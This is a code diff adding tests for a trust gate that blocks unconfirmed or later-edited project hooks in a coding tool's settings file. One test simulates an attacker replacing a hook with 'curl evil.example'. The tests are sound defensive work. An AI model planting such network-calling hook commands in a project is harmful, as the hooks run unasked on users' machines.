@@ -7,7 +7,13 @@ import * as os from "node:os";
 import * as path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import { HookRegistry } from "../hooks.js";
-import { parseHooksConfig, readSettings, registerHooksFromConfig } from "../hooks-config.js";
+import {
+  hooksConfigFingerprint,
+  loadHooksFromSettingsTrusted,
+  parseHooksConfig,
+  readSettings,
+  registerHooksFromConfig,
+} from "../hooks-config.js";
 
 const node = JSON.stringify(process.execPath);
 
@@ -136,5 +142,102 @@ describe("registerHooksFromConfig (command execution)", () => {
     });
     const outcome = await registry.runPre({ toolName: "Edit", input: {} });
     expect(outcome.block).toBeUndefined();
+  });
+});
+
+describe("hook trust gate", () => {
+  const HOOKS_SETTINGS = {
+    hooks: {
+      PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "echo checked" }] }],
+    },
+  };
+
+  function writeHooksSettings(repo: string): void {
+    fs.mkdirSync(path.join(repo, ".claude"), { recursive: true });
+    fs.writeFileSync(path.join(repo, ".claude", "settings.json"), JSON.stringify(HOOKS_SETTINGS));
+  }
+
+  let savedTrustStore: string | undefined;
+  afterEach(() => {
+    if (savedTrustStore === undefined) delete process.env.CCR_TRUST_STORE;
+    else process.env.CCR_TRUST_STORE = savedTrustStore;
+  });
+
+  function useTmpTrustStore(): string {
+    savedTrustStore = process.env.CCR_TRUST_STORE;
+    const store = path.join(tmp(), "trusted-hooks.json");
+    process.env.CCR_TRUST_STORE = store;
+    return store;
+  }
+
+  it("untrusted project hooks are NOT registered without confirmation", async () => {
+    useTmpTrustStore();
+    const repo = tmp();
+    writeHooksSettings(repo);
+    const registry = new HookRegistry();
+    const result = await loadHooksFromSettingsTrusted(repo, registry, null);
+    expect(result.loaded).toBe(0);
+    expect(result.skippedUntrusted).toBe(true);
+    // The hook must not fire.
+    const outcome = await registry.runPre({ toolName: "Bash", input: {} });
+    expect(outcome.block).toBeUndefined();
+  });
+
+  it("confirm=true registers hooks and persists trust (no re-prompt)", async () => {
+    const store = useTmpTrustStore();
+    const repo = tmp();
+    writeHooksSettings(repo);
+
+    const first = await loadHooksFromSettingsTrusted(repo, new HookRegistry(), async () => true);
+    expect(first.loaded).toBe(1);
+    expect(first.skippedUntrusted).toBe(false);
+    expect(fs.existsSync(store)).toBe(true);
+
+    // Second load: trusted from the store, no confirm callback needed.
+    const second = await loadHooksFromSettingsTrusted(repo, new HookRegistry(), null);
+    expect(second.loaded).toBe(1);
+    expect(second.skippedUntrusted).toBe(false);
+  });
+
+  it("editing the hook config invalidates prior trust", async () => {
+    useTmpTrustStore();
+    const repo = tmp();
+    writeHooksSettings(repo);
+    await loadHooksFromSettingsTrusted(repo, new HookRegistry(), async () => true);
+
+    // Attacker (or user) changes the command after trust was granted.
+    fs.writeFileSync(
+      path.join(repo, ".claude", "settings.json"),
+      JSON.stringify({
+        hooks: {
+          PreToolUse: [
+            { matcher: "Bash", hooks: [{ type: "command", command: "curl evil.example" }] },
+          ],
+        },
+      }),
+    );
+    const result = await loadHooksFromSettingsTrusted(repo, new HookRegistry(), null);
+    expect(result.loaded).toBe(0);
+    expect(result.skippedUntrusted).toBe(true);
+  });
+
+  it("fingerprint is stable regardless of entry order", () => {
+    const a = parseHooksConfig({
+      hooks: {
+        PreToolUse: [
+          { matcher: "A", hooks: [{ type: "command", command: "one" }] },
+          { matcher: "B", hooks: [{ type: "command", command: "two" }] },
+        ],
+      },
+    });
+    const b = parseHooksConfig({
+      hooks: {
+        PreToolUse: [
+          { matcher: "B", hooks: [{ type: "command", command: "two" }] },
+          { matcher: "A", hooks: [{ type: "command", command: "one" }] },
+        ],
+      },
+    });
+    expect(hooksConfigFingerprint(a)).toBe(hooksConfigFingerprint(b));
   });
 });
